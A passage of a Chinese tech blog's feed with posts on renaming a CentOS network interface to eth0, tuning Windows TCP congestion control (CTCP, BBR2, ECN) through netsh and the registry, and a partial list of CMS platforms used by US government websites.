        <content type="html"><![CDATA[<h1 id="linux-网卡名称更改">Linux 网卡名称更改</h1><h2 id="网卡配置文件名称重命名">网卡配置文件名称重命名</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">[root@Jaking11 ~]# ifconfigens33: flags=4163  mtu 1500        inet 192.168.10.11  netmask 255.255.255.0  broadcast 192.168.10.255        inet6 fe80::250:56ff:fe29:eae  prefixlen 64  scopeid 0x20        ether 00:50:56:29:0e:ae  txqueuelen 1000  (Ethernet)        RX packets 132  bytes 14492 (14.1 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 115  bytes 13105 (12.7 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0lo: flags=73  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10        loop  txqueuelen 1000  (Local Loopback)        RX packets 140  bytes 11204 (10.9 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 140  bytes 11204 (10.9 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0[root@Jaking11 ~]# [root@Jaking11 ~]# cd /etc/sysconfig/network-scripts/[root@Jaking11 network-scripts]# lsifcfg-ens33  ifdown-ppp       ifup-eth     ifup-sitifcfg-lo     ifdown-routes    ifup-ippp    ifup-Teamifdown       ifdown-sit       ifup-ipv6    ifup-TeamPortifdown-bnep  ifdown-Team      ifup-isdn    ifup-tunnelifdown-eth   ifdown-TeamPort  ifup-plip    ifup-wirelessifdown-ippp  ifdown-tunnel    ifup-plusb   init.ipv6-globalifdown-ipv6  ifup             ifup-post    network-functionsifdown-isdn  ifup-aliases     ifup-ppp     network-functions-ipv6ifdown-post  ifup-bnep        ifup-routes[root@Jaking11 network-scripts]# mv ifcfg-ens33 ifcfg-eth0[root@Jaking11 network-scripts]# vim ifcfg-eth0 TYPE=EthernetPROXY_METHOD=noneBROWSER_ONLY=noBOOTPROTO=staticDEFROUTE=yesIPV4_FAILURE_FATAL=noNAME=eth0DEVICE=eth0ONBOOT=yesIPADDR=192.168.10.11GATEWAY=192.168.10.2NETMASK=255.255.255.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="禁用网卡命名规则">禁用网卡命名规则</h2><p>此功能通过</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">/etc/default/grub<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>文件来控制，要禁用此功能，在文件中加入</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">"net.ifnames=0  biosdevname=0"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">[root@Jaking11 network-scripts]# vim /etc/default/grub  GRUB_TIMEOUT=5GRUB_DISTRIBUTOR="$(sed 's, release .*$,,g' /etc/system-release)"GRUB_DEFAULT=savedGRUB_DISABLE_SUBMENU=trueGRUB_TERMINAL_OUTPUT="console"GRUB_CMDLINE_LINUX="crashkernel=auto rd.lvm.lv=centos/root rd.lvm.lv=centos/swap rhgb quiet net.ifnames=0 biosdevname=0"GRUB_DISABLE_RECOVERY="true"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="添加udev网卡规则">添加udev网卡规则</h2><p>在 <code>/etc/udev/rules.d</code>目录中创建一个网卡规则70-persistent-net.rules文件，在文件中写入以下参数：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">SUBSYSTEM=="net",ACTION=="add",DRIVERS=="?*",ATTR{address}=="需要修改名称的网卡MAC地址",ATTR｛type｝=="1" ,KERNEL=="eth*",NAME="eth0"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参考配置：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">[root@Jaking11 rules.d]# vim 70-persistent-net.rulesSUBSYSTEM=="net",ACTION=="add",DRIVERS=="?*",ATTR{address}=="00:50:56:29:0e:ae",ATTR｛type｝=="1" ,KERNEL=="eth*",NAME="eth0"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>执行grub2-mkconfig -o /boot/grub2/grub.cfg<a href="https://link.zhihu.com/?target=https%3A//www.linuxcool.com/">命令</a>生成更新grub配置参数</strong></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">[root@Jaking11 rules.d]# grub2-mkconfig -o /boot/grub2/grub.cfgGenerating grub configuration file ...Found linux image: /boot/vmlinuz-3.10.0-957.el7.x86_64Found initrd image: /boot/initramfs-3.10.0-957.el7.x86_64.imgFound linux image: /boot/vmlinuz-0-rescue-fe49b659ccb940fa8d260a5897c0b08aFound initrd image: /boot/initramfs-0-rescue-fe49b659ccb940fa8d260a5897c0b08a.imgdone<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>重启<a href="https://link.zhihu.com/?target=https%3A//www.linuxprobe.com/">Linux系统</a>后验证网卡名称是否更改成功</strong></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">[root@Jaking11 ~]# ifconfigeth0: flags=4163  mtu 1500        inet 192.168.10.11  netmask 255.255.255.0  broadcast 192.168.10.255        inet6 fe80::250:56ff:fe29:eae  prefixlen 64  scopeid 0x20        ether 00:50:56:29:0e:ae  txqueuelen 1000  (Ethernet)        RX packets 86  bytes 10889 (10.6 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 95  bytes 10828 (10.5 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0lo: flags=73  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10        loop  txqueuelen 1000  (Local Loopback)        RX packets 0  bytes 0 (0.0 B)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 0  bytes 0 (0.0 B)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows TCP 拥塞控制算法</title>
      <link href="/2023/04/14/windows-tcp-yong-sai-kong-zhi-suan-fa/"/>
      <url>/2023/04/14/windows-tcp-yong-sai-kong-zhi-suan-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="windows-tcp-拥塞控制算法">Windows TCP 拥塞控制算法</h1><h2 id="bbr">BBR</h2><ul><li>https://zhuanlan.zhihu.com/p/543011535</li><li>https://github.com/google/bbr</li></ul><p>说明：WIN10专业版，前几日访问油管connectionspeed一直缓冲，换一台电脑马上速度飙到几万，另外也有童鞋提醒跟本地网络有关。经过1天多的各种尝试，终于找到解决方案，就是调节了TCP全局参数 ，现在的速度提升50%。现提供方法给大家参考。</p><p><strong>管理员运行cmd，运行以下命令：</strong></p><pre class="line-numbers language-none"><code class="language-none">netsh int tcp show global TCP 全局参数----------------------------------------------接收方缩放状态          : enabled接收窗口自动调节级别    : normal加载项拥塞控制提供程序  : defaultECN 功能                      : disabledRFC 1323 时间戳                 : enabled初始 RTO                         : 1000接收段合并状态    : enabled非 Sack Rtt 复原             : disabled最大 SYN 重新传输次数             : 4快速打开                           : enabled快速打开回退                  : enabledHyStart                             : enabled比例费率降低         : enabled节奏配置文件                      : off<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改以下几项，解决了网速慢的问题，命令都是在CMD中输入，然后重启。</p><p>直接缓存访问(DCA)：</p><pre class="line-numbers language-none"><code class="language-none">netsh int tcp set global dca=enabled<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接收窗口自动调谐级别：</p><pre class="line-numbers language-none"><code class="language-none">netsh int tcp set global autotuninglevel=normal<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>附加拥塞控制提供程序</p><pre class="line-numbers language-none"><code class="language-none">netsh int tcp set supplemental template=internet congestionprovider=ctcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>RFC 1323 时间戳：</p><pre class="line-numbers language-none"><code class="language-none">netsh int tcp set global timestamps=enabled<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="benchmark-of-bbr">Benchmark of BBR</h2><p>https://arxiv.org/pdf/1810.13241.pdf</p><hr><p>Linux上有bbr，windows上也有ctcp</p><p>使用管理员模式在命令模式下运行</p><p>netsh int tcp set supplemental template=internetcongestionprovider=ctcp</p><p>xxxxxxxxxx&nbsp;[root@Jaking11 ~]# ifconfigeth0: flags=4163 mtu 1500 &nbsp; &nbsp; &nbsp;inet 192.168.10.11 netmask 255.255.255.0 broadcast 192.168.10.255 &nbsp; &nbsp; &nbsp;inet6 fe80::250:56ff:fe29:eae prefixlen 64 scopeid 0x20 &nbsp; &nbsp; &nbsp; ether00:50:56:29:0e:ae txqueuelen 1000 (Ethernet) &nbsp; &nbsp; &nbsp; RX packets 86 bytes10889 (10.6 KiB) &nbsp; &nbsp; &nbsp; RX errors 0 dropped 0 overruns 0 frame 0 &nbsp; &nbsp; &nbsp; TXpackets 95 bytes 10828 (10.5 KiB) &nbsp; &nbsp; &nbsp; TX errors 0 dropped 0 overruns 0carrier 0 collisions 0​lo: flags=73 mtu 65536 &nbsp; &nbsp; &nbsp; inet 127.0.0.1netmask 255.0.0.0 &nbsp; &nbsp; &nbsp; inet6 ::1 prefixlen 128 scopeid 0x10 &nbsp; &nbsp; &nbsp; looptxqueuelen 1000 (Local Loopback) &nbsp; &nbsp; &nbsp; RX packets 0 bytes 0 (0.0 B) &nbsp; &nbsp;&nbsp; RX errors 0 dropped 0 overruns 0 frame 0 &nbsp; &nbsp; &nbsp; TX packets 0 bytes 0(0.0 B) &nbsp; &nbsp; &nbsp; TX errors 0 dropped 0 overruns 0 carrier 0 collisions0text</p><p>默认是下面的cubic。现在运行下命令就改成了ctcp</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://www.azurew.com/wp-content/uploads/2021/10/102921_0631_windowstcp1.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><p>另外我看了下powershell下面可以用下面的命令，好像是因为新系统下面netsh命令已经没用了</p><p>Set-NetTCPSetting -SettingName “InternetCustom” -CongestionProviderCTCP -InitialCongestionWindowMss 6</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://www.azurew.com/wp-content/uploads/2021/10/102921_0631_windowstcp2.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><h2 id="显示windows所有tcp设置参数">显示windows所有TCP设置参数</h2><p>在CMD命令行输入以下命令 <code>netsh int tcp show global</code></p><pre class="line-numbers language-none"><code class="language-none">C:\Users\admin&gt;netsh int tcp show global查询活动状态...TCP 全局参数----------------------------------------------接收方缩放状态                    : enabled烟囱卸载状态                      : automaticNetDMA 状态                       : enabled直接缓存访问(DCA)                 : enabled接收窗口自动调谐级别              : normal附加拥塞控制提供程序              : ctcpECN 功能                          : disabledRFC 1323 时间戳                   : enabled<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="tcp优化设置命令">TCP优化设置命令</h2><pre class="line-numbers language-none"><code class="language-none">直接缓存访问(DCA)：netsh int tcp set global dca=enabled接收窗口自动调谐级别：netsh int tcp set global autotuninglevel=normal附加拥塞控制提供程序：netsh interface tcp set global congestionprovider=ctcpwin10附加拥塞控制：netsh int tcp set supplemental template=internet congestionprovider=ctcpRFC 1323 时间戳：netsh int tcp set global timestamps=enabled<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="一定要关闭ecn">一定要关闭ECN</h2><p>ECN为显式拥塞通知.启用ECN可以告知对方主机拥塞状况,好处是让网络曲线更平滑.然而,大多数主机并没有启用ECN,一旦启用就会增加等待超时时间,反而降低了网络性能<code>netsh int tcp set global ecn=disable</code></p><h2 id="setting">Setting</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">netsh int ip <span class="token function">set</span> global congestprovider=CTCP<span class="token function">Set-NetTCPSetting</span> <span class="token operator">-</span>SettingName <span class="token string">"InternetCustom"</span> <span class="token operator">-</span>CongestionProvider CTCP <span class="token operator">-</span>InitialCongestionWindowMss 6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nsi\{eb004a03-9b1a-11d4-9123-0050047759bc}\0]"0200"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\00,00,00,00,00,00,02,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\00,00,00,ff,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\ff,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00"1700"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\00,00,00,00,00,00,02,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\00,00,00,ff,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\ff,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>https://www.speedguide.net/forums/showthread.php?291853-Bypass-Windows-10-Restrictions-(Templates-CongestionProvider)-etc</p><h3 id="bbr2">BBR2</h3><pre class="line-numbers language-none"><code class="language-none">netsh int tcp set supplemental Template=Internet CongestionProvider=bbr2netsh int tcp set supplemental Template=Datacenter CongestionProvider=bbr2netsh int tcp set supplemental Template=Compat CongestionProvider=bbr2netsh int tcp set supplemental Template=DatacenterCustom CongestionProvider=bbr2netsh int tcp set supplemental Template=InternetCustom CongestionProvider=bbr2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="registry">Registry</h2><p>https://www.speedguide.net/articles/windows-10-manual-tcpip-registry-tweaks-7507</p><h2 id="references">References</h2><ul><li><p>https://techcommunity.microsoft.com/t5/networking-blog/windows-transport-converges-on-two-congestion-providers-cubic/ba-p/339819</p></li><li><p>https://lxadm.com/netsh-int-tcp-set-global-congestionprovider-ctcp/</p></li><li><p>https://learn.microsoft.com/en-us/powershell/module/nettcpip/set-nettcpsetting?view=windowsserver2022-ps</p></li><li><p>https://www.oocolo.com/886.html</p></li><li><p>https://www.azurew.com/windows/windows-server-2016/8703.html</p></li><li><p>https://itren.org/501.html</p></li><li><p>https://www.haah.net/archives/8817.html</p></li><li><p>https://stackoverflow.com/questions/60159716/how-to-enable-tcp-bbr-on-windows/75556970#75556970</p></li><li><p>https://islun.com/660/</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>美国政府网站使用的CMS平台</title>
      <link href="/2023/04/14/mei-guo-zheng-fu-wang-zhan-shi-yong-de-cms-ping-tai/"/>
      <url>/2023/04/14/mei-guo-zheng-fu-wang-zhan-shi-yong-de-cms-ping-tai/</url>
      
        <content type="html"><![CDATA[<h2 id="federal-government">Federal Government</h2><p><strong>Agency or website (Tool, product or service)</strong></p><p><a href="https://www.usda.gov/">Agriculture</a> (Drupal 8)</p><ul><li><p><a href="https://www.aphis.usda.gov/aphis/home/">Animal HealthInspection Service</a> (IBM WebSphere WCM)</p></li><li><p><a href="http://www.ers.usda.gov/">Economic Research Service</a>(Umbraco)</p></li><li><p><a href="http://www.fsa.usda.gov/FSA/webapp?area=home&amp;subject=landing&amp;topic=landing">FarmService Agency</a> (Oracle UCM)</p></li><li><p><a href="https://www.farmers.gov/">Farmers.gov</a> (Drupal8)</p></li><li><p>Food and Nutrition Service</p><p>(Drupal 7, moving to Drupal 8 in 2018)</p><ul><li><a href="https://wicworks.fns.usda.gov/">WIC Works ResourceSystem</a> (Drupal 8)</li></ul></li><li><p><a href="http://www.fs.fed.us/">Forest Service</a> (Front end:IBM Websphere Portal; back end: Stellent [now Oracle UCM]. Transitioningto Drupal using a Forest Service curated Drupal distribution)</p></li><li><p><a href="https://www.ocio.usda.gov/">Office of the ChiefInformation Officer</a> (Drupal 7)</p></li><li><p><a href="https://www.ascr.usda.gov/">Office of the AssistantSecretary for Civil Rights</a> (Drupal 7)</p></li></ul><p><a href="https://www.cia.gov/">Central Intelligence Agency</a>(Plone)</p><p><a href="http://www.commerce.gov/">Commerce</a> (Drupal)</p><ul><li><a href="http://www.nist.gov/">National Institute of Standards &amp;Technology</a> (Drupal)</li><li><a href="http://www.noaa.gov/">National Oceanic &amp; AtmosphericAdministration</a> (DotNetNuke/SharePoint)</li><li><a href="http://www.ntia.doc.gov/">National Telecommunications &amp;Information Administration</a> (Drupal/Proofpoint)</li><li><a href="http://www.uspto.gov/">Patent &amp; Trademark Office</a>(Drupal)</li><li><a href="http://www.bea.gov/">U.S. Bureau of Economic Analysis(BEA)</a> (IntranetConnections)</li><li><a href="https://www.census.gov/">U.S. Census Bureau</a> (AdobeExperience Manager (AEM))</li></ul><p><a href="http://www.cftc.gov/">Commodity Futures TradingCommission</a> (Drupal 8)</p><ul><li><a href="https://www.smartcheck.gov">SmartCheck.gov</a> (Drupal8)</li><li><a href="https://www.whistleblower.gov">Whistleblower.gov</a>(Drupal 8)</li></ul><p><a href="http://www.consumerfinance.gov/">Consumer FinancialProtection Bureau</a> (Wagtail)</p><p><a href="http://www.cpsc.gov/">Consumer Product Safety Commission</a>(EpiServer)</p><p><a href="http://www.defense.gov/">Defense</a> (DotNetNuke)</p><ul><li><a href="http://www.airforce.com/">Air Force</a> (Broadvision(Portal))</li><li><a href="https://home.army.mil/imcom/index.php">Army</a> (ConcreteCMS)</li><li><a href="https://armymwr.com/">Army MWR</a> (Concrete CMS)</li><li><a href="https://www.armywcap.com/">Army WCAP</a> (ConcreteCMS)</li><li><a href="https://www.mwrbrandcentral.com/">Army BrandCentral</a>(Concrete CMS)</li><li><a href="http://www.commissaries.com/">Defense Commissary Agency</a>(Home-grown)</li><li><a href="http://www.dfas.mil/">Defense Finance &amp; AccountingService</a> (Documentum/Plumtree/BizFlow)</li><li><a href="http://www.disa.mil/">Defense Information SystemsAgency</a> (Sitecore)</li><li><a href="http://www.dia.mil/">Defense Intelligence Agency</a>(None)</li><li><a href="http://www.mc.mil/">Defense Office of MilitaryCommissions</a> (DotNetNuke/SharePoint)</li><li><a href="http://www.dodea.edu/">Education Activity</a>(CommonSpot)</li><li><a href="http://www.usmc-mccs.org/">Marine Corps CommunityServices</a> (In-house)</li><li><a href="http://www.health.mil/default.aspx">Military HealthSystem</a> (Sitecore)</li><li>Navy Enterprise Maintenance System (Documentum)</li><li><a href="http://www.public.navy.mil/bupers-npc/Pages/default.aspx">NavyPersonnel Command</a> (Microsoft’s Content Management Server)</li><li><a href="https://www.onr.navy.mil/">Office of Naval Research</a>(Sitecore for external, Sharepoint for intranet)</li></ul><p><a href="http://www.ed.gov/">Education</a> (Drupal/WordPress)</p><p><a href="http://energy.gov/">Energy</a> (Drupal)</p><ul><li><a href="http://www.eia.gov/">Energy Information Administration</a>(None)</li><li><a href="https://www.llnl.gov/">Lawrence Livermore NationalLaboratory</a> (Drupal)</li><li><a href="http://www.eere.energy.gov/">Office of Energy Efficiency&amp; Renewable Energy</a> (OpenText)</li><li><a href="http://www.osti.gov/home/">Office of Scientific &amp;Technical Information</a> (Drupal/Confluence, Sharepoint)</li><li><a href="http://www.sandia.gov/">Sandia National Laboratories</a>(Cascade Server by Hannon Hill/WordPress, Drupal, SharePoint)</li><li><a href="http://ww2.wapa.gov/sites/western/Pages/default.aspx">Western AreaPower Administration</a> (Serena Collage)</li></ul><p><a href="http://www.epa.gov/">Environmental Protection Agency</a>(Drupal)</p><ul><li><a href="http://water.epa.gov/">Office of Water</a></li><li><a href="http://www.epa.gov/aboutepa/region8.html">Region 8</a></li></ul><p><a href="http://www.fca.gov/index.html">Farm CreditAdministration</a> (Serena Collage [not presently using it])</p><p><a href="http://www.fcc.gov/">Federal Communications Commission</a>(Drupal/Documentum)</p><p><a href="https://www.fec.gov/">Federal Election Commission</a>(Wagtail)</p><p><a href="http://www.federalreserve.gov/">Federal Reserve Board ofGovernors</a> (RedDot)</p><p><a href="http://www.ftc.gov/">Federal Trade Commission</a>(Drupal)</p><p><a href="http://gsa.gov/">General Services Administration</a>(Drupal)</p><ul><li><p>GSA Intranet site (Drupal 7)</p></li><li><p>Technology Transformation Services</p><p>(TTS),</p><p>Office of Products and Programs</p><ul><li><a href="https://www.digital.gov/">DigitalGov</a> (GitHub)</li><li><a href="https://www.search.gov/">Search.gov</a> [formerly<em>DigitalGov Search</em>] (GitHub)</li><li><a href="https://www.usa.gov/">USAGov</a>, <a href="https://www.usa.gov/espanol/">USAGov en Español</a> (<em>formerlyknown as GobiernoUSA.gov</em>) (Drupal 7)</li></ul></li></ul><p><a href="http://www.hhs.gov/">Health &amp; Human Services</a>(Percussion)</p><ul><li><a href="http://www.acf.hhs.gov/">Administration for Children &amp;Families</a> (Drupal)</li><li><a href="http://www.aoa.gov/">Administration on Aging</a> (ContentStudio)</li><li><a href="http://www.innovations.cms.gov/">Center for Medicare &amp;Medicaid Innovation</a> (Percussion)</li><li><a href="http://www.cdc.gov/">Centers for Disease Control &amp;Prevention</a> (Percussion/Accenture tool)</li><li><a href="http://www.cms.gov/">Centers for Medicare &amp; MedicaidServices</a> (Commercial Product)</li><li><a href="http://www.fda.gov/">Food &amp; Drug Administration</a>(Oracle/Stellent v.10)</li><li><a href="http://www.cancer.gov/">National Cancer Institute</a>(Percussion/Internet, Drupal/Intranet)</li><li><a href="http://dceg.cancer.gov/">National Cancer Institute/Divisionof Cancer Epidemiology and Genetics</a> (Plone [Intranet], Percussion[Public-Facing])</li><li><a href="http://www.nimh.nih.gov/index.shtml">National Institute ofMental Health</a> (Percussion)</li><li><a href="http://www.nih.gov/">National Institutes of Health</a>(Percussion)</li><li><a href="https://hr.nih.gov/">National Institutes of Health—Officeof Human Resources</a> (Drupal)</li><li><a href="http://www.nlm.nih.gov/">National Library of Medicine</a>(TeamSite/Adobe Contribute, Drupal, Custom built systems)</li><li>Office of Communications and Education (Percussion)</li><li><a href="https://www.drugabuse.gov/">National Institute on DrugAbuse</a> (Drupal)</li></ul><p><a href="http://www.dhs.gov/">Homeland Security</a> (Drupal 9)</p><ul><li><a href="http://www.uscis.gov/portal/site/uscis">Citizenship &amp;Immigration Services</a> (Drupal 9)</li><li><a href="http://www.uscg.mil/">Coast Guard (Intranet)</a>(Broadvision)</li><li><a href="http://www.cbp.gov/">Customs &amp; Border Protection</a>(Drupal 9)</li><li><a href="http://www.fema.gov/">Federal Emergency ManagementAgency</a> (Drupal 9)</li><li><a href="http://www.ice.gov/">Immigration &amp; CustomsEnforcement</a> (Drupal 9)</li><li><a href="http://www.tsa.gov/">Transportation SecurityAdministration</a> (Drupal 9)</li><li><a href="https://www.secretservice.gov/">U.S. Secret Service</a>(Drupal 9)</li></ul><p><a href="http://portal.hud.gov/hudportal/HUD">Housing and UrbanDevelopment</a> (Oracle WebCenter)</p><p><a href="http://www.doi.gov/index.cfm">Interior</a> (Drupal PaaS)</p><ul><li><a href="https://www.alaskacenters.gov/">Alaska Centers Public LandsInformation</a> (Drupal PaaS)</li><li><a href="https://www.bia.gov/">Bureau of Indian Affairs</a> (DrupalPaaS)</li><li><a href="https://www.blm.gov/">Bureau of Land Management</a> (DrupalPaaS)</li><li><a href="https://www.bsee.gov/">Bureau of Safety and EnvironmentalEnforcement</a> (Drupal PaaS)</li><li><a href="https://www.fcg.gov/">Federal Consulting Group</a> (DrupalPaaS)</li><li><a href="http://www.nps.gov/index.htm">National Park Service</a>(CommonSpot)</li><li><a href="https://www.doioig.gov/">Office of Inspector General</a>(Drupal PaaS)</li><li><a href="https://www.fws.gov/">U.S. Fish and Wildlife Service’sNational Wildlife Refuge System</a> (Ektron CMS 400)</li></ul><p><a href="http://www.justice.gov/">Justice</a> (Currently migrating toDrupal; expected completion: Spring 2015)</p><ul><li><a href="http://www.justice.gov/enrd/">Environmental &amp; NaturalResources Division</a> (RedDot)</li><li><a href="http://www.nij.gov/">National Institute of Justice</a>(SharePoint 2013/EZRO)</li></ul><p><a href="http://www.dol.gov/">Labor</a> (None)</p><ul><li><a href="http://www.bls.gov/">Bureau of Labor Statistics</a>(In-house system)</li><li><a href="http://www.doleta.gov/">Employment &amp; TrainingAdministration</a> (webZerve)</li></ul><p><a href="http://www.gov.gov/index.html">Library of Congress</a>(Interwoven)</p><p><a href="http://www.mcc.gov/">Millenium Challenge Corporation</a>(ExpressionEngine)</p><p><a href="http://www.nasa.gov/">National Aeronautics and SpaceAdministration</a> (Digital Asset Manager, eTouch Systems)</p><ul><li><a href="http://www.jpl.nasa.gov/">Jet Propulsion Laboratory</a>(Plone)</li><li><a href="http://www.kennedyspacecenter.com/">Kennedy SpaceCenter</a> (Inmagic Presto)</li></ul><p><a href="http://www.archives.gov/">National Archives &amp; RecordsAdministration</a> (Drupal)</p><p><a href="http://www.ncua.gov/Pages/default.aspx">National CreditUnion Administration</a> (MS SharePoint 2010)</p><p><a href="http://www.nea.gov/">National Endowment for the Arts</a>(Drupal 7)</p><p><a href="https://www.nist.gov/">National Institute of Standards andTechnology</a> (Drupal)</p><p><a href="http://www.nlrb.gov/">National Labor Relations Board</a>(Drupal)</p><p><a href="http://www.nsf.gov/">National Science Foundation</a>(ePublish)</p><ul><li><a href="http://www.nsf.gov/oig/">Office of Inspector General</a>(None)</li></ul><p><a href="http://www.opm.gov/">Office of Personnel Management</a>(Umbraco)</p><p><a href="https://www.openworld.gov/">Open World Leadership Center</a>(Drupal 7)</p><p><a href="http://www.peacecorps.gov/">Peace Corps</a> (Wagtail forexternal, Sharepoint for intranet)</p><p><a href="http://www.pbgc.gov/">Pension Benefit GuarantyCorporation</a> (Drupal 7)</p><p><a href="http://www.recovery.gov/Pages/default.aspx">RecoveryAccountability &amp; Transparency Board</a> (SharePoint)</p><p><a href="http://www.sec.gov/">Securities &amp; ExchangeCommission</a> (Drupal)</p><p><a href="http://www.senate.gov/">Senate</a> (Documentum)</p><p><a href="http://www.sba.gov/">Small Business Administration</a>(Drupal)</p><p><a href="http://www.si.edu/">Smithsonian Institution</a>(Interwoven)</p><p><a href="http://www.socialsecurity.gov/">Social SecurityAdministration</a> (Drupal)</p><p><a href="http://www.state.gov/">State</a></p><ul><li><a href="http://www.america.gov/">ShareAmerica.gov</a>(WordPress)</li><li>Consular Affairs Percussion [Intranet])</li><li>U.S. Embassy Websites (WordPress)</li><li>IRM Business Center (In-house [PortalX 1.3])</li></ul><p><a href="https://www.tva.gov/">Tennessee Valley Authority</a>(Sitefinity)</p><p><a href="http://www.dot.gov/">Transportation</a> (Drupal)</p><p><a href="https://home.treasury.gov/">Treasury</a> (Drupal 9)</p><ul><li><a href="http://www.publicdebt.treas.gov/">Bureau of the PublicDebt</a> (None)</li><li><a href="http://www.irs.gov/">Internal Revenue Service</a>(Commercial Product/Vignette)</li><li><a href="http://occ.gov/">Office of the Comptroller of theCurrency</a> (Commercial Product/SharePoint)</li><li>U.S. Mint (None [Intranet])</li></ul><p><a href="http://www.usaid.gov/">United States Agency forInternational Development</a> (Drupal)</p><p>U.S. Congress, <a href="https://www.cbo.gov/">Congressional BudgetOffice</a> (Drupal public website, SharePoint intranet)</p><p>United States Courts (Sitefinity [Intranet])</p><p><a href="https://www.usps.com/">United States Postal Service</a>(Broadvision [e-commerce]/Interwoven [usps.gov])</p><p><a href="http://www.va.gov/">Veterans Affairs</a> (TeamSite)</p><ul><li><a href="http://www.virec.research.va.gov/">Veterans AffairsInformation Resource Center</a> (Adobe Contribute)</li><li><a href="http://www.va.gov/health/default.asp">Veterans HealthAdministration</a> (Interwoven TeamSite)</li></ul><p><a href="http://www.voanews.com/">Voice of America</a> (Pangea)</p><p><a href="http://www.whitehouse.gov/">White House</a> (WordPress)</p><h2 id="state-government">State Government</h2><p><strong>Agency or website (Tool, product or service)</strong></p><p><a href="https://aset.az.gov/">Arizona Strategic EnterpriseTechnology (ASET) Office</a> (Drupal)</p><p><a href="http://www.ca.gov/">California</a> (Broadvision)</p><ul><li><a href="https://www.cde.ca.gov/">California Department ofEducation</a> (Adobe Contribute integrated with in-house system)</li><li><a href="https://dot.ca.gov/">Caltrans: California Department ofTransportation</a> (Sitecore)</li><li><a href="http://www.dfg.ca.gov/">Department of Fish &amp; Game</a>(DotNetNuke)</li></ul><p><a href="http://dhs.georgia.gov/">Georgia Department of HumanServices</a> (Vignette)</p><p><a href="http://hawaii.gov/tax/">Hawaii Department of Taxation</a>(Plone 3.0.5)</p><p><a href="http://www.illinois.gov/Pages/default.aspx">Illinois</a>(Microsoft SharePoint)</p><p><a href="http://www.interstatecompact.org/">Interstate Commission forAdult Offender Supervision</a> (Drupal 8)</p><p><a href="http://www.mass.gov/portal/">Massachusetts</a>(Percussion)</p><p><a 